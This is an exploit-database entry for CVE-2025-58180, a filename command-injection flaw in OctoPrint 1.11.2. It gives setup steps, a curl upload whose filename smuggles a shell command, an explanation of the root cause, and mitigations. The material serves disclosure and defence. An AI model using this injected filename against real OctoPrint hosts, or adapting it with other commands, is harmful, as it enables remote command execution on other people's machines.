---
title: OctoPrint 1.11.2 File Upload
url: https://cxsecurity.com/issue/WLB-2026040005
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-04-09
fetch_date: 2026-04-10T04:44:44.876804
---

# OctoPrint 1.11.2 File Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **OctoPrint 1.11.2 File Upload** **2026.04.09**  Credit:  **[prabhatverma.addada](https://cxsecurity.com/author/prabhatverma.addada/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-58180](https://cxsecurity.com/cveshow/CVE-2025-58180/ "Click to see CVE-2025-58180")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# Exploit Title: OctoPrint 1.11.2 - File Upload
# Date: 2025-09-28
# Exploit Author: prabhatverma.addada
# Vendor Homepage: https://octoprint.org
# Software Link: https://github.com/OctoPrint/OctoPrint
# Affected Version(s): <= 1.11.2
# Patched Version(s): 1.11.3
# CVE: CVE-2025-58180
# CVSS (per advisory): 7.5
# Platform: Linux / OctoPrint server
# Type: Remote Code Execution (requires authenticated upload / API key or session)
#
# Short description:
# An authenticated attacker with file-upload access can craft a filename containing shell metacharacters (e.g. ';', ${IFS}) which bypasses filename
# sanitization and, when interpolated into a configured system event handler command, results in arbitrary command execution on the host.
#
# Scope & privileges:
# - Trigger privileges: Authenticated file-upload (API key or valid session). NO admin/root required to trigger the attack.
# - Precondition: A system event handler that executes shell commands using filename/path placeholders must be configured by an administrator.
#
# Tested on:
# - OctoPrint 1.11.2 running via `octoprint serve --port 5000` on Ubuntu 22.04
#
# Reproduction / PoC (manual):
#
# 1) Start OctoPrint 1.11.2:
# octoprint serve --port 5000 --debug
# Complete initial setup at http://127.0.0.1:5000 and create an admin user.
#
# 2) Configure a system event handler that runs shell commands with filename placeholders:
# Edit ~/.octoprint/config.yaml and add:
#
# events:
# enabled: true
# subscriptions:
# - event: FileAdded
# type: system
# debug: true
# command: "{path}"
#
# Restart OctoPrint.
#
# 3) Create a harmless test gcode:
# mkdir -p /tmp/gcode
# cat > /tmp/gcode/ok.gcode <<'EOF'
# ; minimal gcode
# G28
# M105
# EOF
#
# 4) Obtain API key from Settings -> API and export it:
# export API\_KEY='<your\_api\_key\_here>'
#
# 5) Ensure target proof file does not exist:
# ls -la /tmp/test123
#
# 6) PoC upload (non-destructive proof):
# INJECT\_NAME='octo;touch${IFS}/tmp/test123;#.gcode'
#
# curl -sS -X POST -H "X-Api-Key: $API\_KEY" \
# -F "file=@/tmp/gcode/ok.gcode;filename=\"${INJECT\_NAME}\"" \
# "http://127.0.0.1:5000/api/files/local"
#
# 7) Verify execution:
# ls -la /tmp/test123
# If /tmp/test123 exists, the injected command executed and RCE is demonstrated.
#
# Explanation:
# - OctoPrint accepted the uploaded filename (sanitize\_name allowed these characters in default config).
# - FileAdded event payload contains the filename/path.
# - A system event subscriber executed a shell command with that placeholder via subprocess with shell=True and without placeholder escaping.
# - Shell metacharacters in the filename are interpreted by the shell and executed.
#
# Mitigations / Workarounds:
# - Upgrade OctoPrint to 1.11.3 (patched).
# - Disable event handlers using filename placeholders (set enabled: false or uncheck in GUI Event Manager).
# - Set feature.enforceReallyUniversalFilenames: true in config.yaml and vet existing uploads.
# - Do not expose OctoPrint to hostile networks; restrict upload access.
#
# References:
# - GitHub Security Advisory: https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-49mj-x8jp-qvfc
# - PoC repo: https://github.com/prabhatverma47/CVE-2025-58180
#
# Notes for triage:
# - Exploit requires only authenticated upload privileges to trigger. No admin/root required to perform the attack.
# - PoC uses non-destructive `touch /tmp/test123`.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026040005)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top